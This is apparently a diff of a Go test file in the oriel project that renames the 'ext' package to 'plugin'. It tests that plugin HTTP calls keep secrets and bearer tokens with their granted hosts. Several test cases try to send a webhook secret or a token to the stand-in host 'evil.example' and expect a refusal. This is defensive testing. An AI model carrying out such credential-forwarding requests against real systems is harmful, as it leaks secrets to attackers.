@@ -1,4 +1,4 @@
-package ext_test
+package plugin_test
 
 import (
 	"encoding/json"
@@ -12,19 +12,19 @@ import (
 	"testing"
 
 	"github.com/liamg/oriel/core"
-	"github.com/liamg/oriel/ext"
-	"github.com/liamg/oriel/ext/exttest"
+	"github.com/liamg/oriel/plugin"
+	"github.com/liamg/oriel/plugin/hosttest"
 )
 
 type network struct {
 	c *http.Client
-	s ext.Secrets
+	s plugin.Secrets
 }
 
-func (n network) Log() *slog.Logger    { return slog.New(slog.NewTextHandler(io.Discard, nil)) }
-func (network) Notify(core.Notice)     {}
-func (n network) Net() *http.Client    { return n.c }
-func (n network) Secrets() ext.Secrets { return n.s }
+func (n network) Log() *slog.Logger       { return slog.New(slog.NewTextHandler(io.Discard, nil)) }
+func (network) Notify(core.Notice)        {}
+func (n network) Net() *http.Client       { return n.c }
+func (n network) Secrets() plugin.Secrets { return n.s }
 
 const hook = "https://hooks.slack.com/services/T000/B000/XXXXSECRET"
 
@@ -43,20 +43,20 @@ func TestHTTPSecretsStayWithTheHost(t *testing.T) {
 		w.Write([]byte("ok"))
 	}))
 	defer srv.Close()
-	secrets := &ext.SecretFile{Path: filepath.Join(t.TempDir(), "secrets.json")}
-	n := network{exttest.Net(srv), secrets}
-	ms := ext.HostMethods(n)
-	g := ext.NewGrants()
-	p := ext.Plugin{ID: "oriel/slack", Guard: g}
-	g.Grant(p.ID, []ext.Grant{{Cap: ext.CapNet, Scope: []string{"hooks.slack.com"}},
-		{Cap: ext.CapSecrets, Scope: []string{"SLACK_WEBHOOK@hooks.slack.com", "TOKEN@api.linear.app"}}})
-	call := func(params map[string]any) (*ext.HTTPResponse, error) {
+	secrets := &plugin.SecretFile{Path: filepath.Join(t.TempDir(), "secrets.json")}
+	n := network{hosttest.Net(srv), secrets}
+	ms := plugin.HostMethods(n)
+	g := plugin.NewGrants()
+	p := plugin.Caller{ID: "oriel/slack", Guard: g}
+	g.Grant(p.ID, []plugin.Grant{{Cap: plugin.CapNet, Scope: []string{"hooks.slack.com"}},
+		{Cap: plugin.CapSecrets, Scope: []string{"SLACK_WEBHOOK@hooks.slack.com", "TOKEN@api.linear.app"}}})
+	call := func(params map[string]any) (*plugin.HTTPResponse, error) {
 		raw, _ := json.Marshal(params)
 		v, err := ms.Call(t.Context(), p, "http.request", raw)
 		if err != nil {
 			return nil, err
 		}
-		return v.(*ext.HTTPResponse), nil
+		return v.(*plugin.HTTPResponse), nil
 	}
 	post := map[string]any{"method": "POST", "url_secret": "SLACK_WEBHOOK", "body": `{"text":"PTAL"}`}
 
@@ -78,7 +78,7 @@ func TestHTTPSecretsStayWithTheHost(t *testing.T) {
 	if _, err := call(post); err == nil || !strings.Contains(err.Error(), `"net" capability isn't declared for evil.example`) {
 		t.Errorf("sent to another host: %v", err)
 	}
-	g.Grant(p.ID, append(g.Declared(p.ID), ext.Grant{Cap: ext.CapNet, Scope: []string{"evil.example"}}))
+	g.Grant(p.ID, append(g.Declared(p.ID), plugin.Grant{Cap: plugin.CapNet, Scope: []string{"evil.example"}}))
 	if _, err := call(post); err == nil || !strings.Contains(err.Error(), `"secrets" capability isn't declared for SLACK_WEBHOOK@evil.example`) {
 		t.Errorf("a net grant doesn't carry the secret elsewhere: %v", err)
 	}
@@ -88,7 +88,7 @@ func TestHTTPSecretsStayWithTheHost(t *testing.T) {
 
 	// A token is sent as a bearer only to its host, and never over plain http.
 	secrets.SetSecret("TOKEN", "tok-XXXXSECRET")
-	g.Grant(p.ID, append(g.Declared(p.ID), ext.Grant{Cap: ext.CapNet, Scope: []string{"api.linear.app"}}))
+	g.Grant(p.ID, append(g.Declared(p.ID), plugin.Grant{Cap: plugin.CapNet, Scope: []string{"api.linear.app"}}))
 	if _, err := call(map[string]any{"url": "https://evil.example/x", "auth": "TOKEN"}); err == nil {
 		t.Error("a bearer token sent to another host")
 	}
@@ -119,7 +119,7 @@ func TestHTTPSecretsStayWithTheHost(t *testing.T) {
 	}
 
 	// Undeclared: no secrets grant, no net grant.
-	g.Grant(p.ID, []ext.Grant{{Cap: ext.CapNet, Scope: []string{"hooks.slack.com"}}})
+	g.Grant(p.ID, []plugin.Grant{{Cap: plugin.CapNet, Scope: []string{"hooks.slack.com"}}})
 	secrets.SetSecret("SLACK_WEBHOOK", hook)
 	if _, err := call(post); err == nil || !strings.Contains(err.Error(), `"secrets" capability isn't declared`) {
 		t.Errorf("without secrets: %v", err)
@@ -130,7 +130,7 @@ func TestHTTPSecretsStayWithTheHost(t *testing.T) {
 	}
 }
 
-func errText(_ *ext.HTTPResponse, err error) string {
+func errText(_ *plugin.HTTPResponse, err error) string {
 	if err == nil {
 		return ""
 	}
@@ -139,7 +139,7 @@ func errText(_ *ext.HTTPResponse, err error) string {
 
 // The secrets file is its owner's alone, and an empty value deletes a secret.
 func TestSecretFile(t *testing.T) {
-	f := &ext.SecretFile{Path: filepath.Join(t.TempDir(), "state", "secrets.json")}
+	f := &plugin.SecretFile{Path: filepath.Join(t.TempDir(), "state", "secrets.json")}
 	if err := f.SetSecret("A", "1"); err != nil {
 		t.Fatal(err)
 	}
